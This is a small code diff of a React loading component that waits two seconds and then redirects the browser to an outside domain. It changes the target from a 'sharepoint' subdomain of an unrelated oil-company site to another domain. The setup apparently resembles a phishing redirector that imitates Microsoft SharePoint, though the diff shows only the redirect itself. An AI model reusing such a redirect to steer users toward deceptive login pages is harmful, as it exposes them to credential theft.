@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://sharepoint.simpleandhappyoils.com';
+            window.location.href = 'https://open.izlet.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
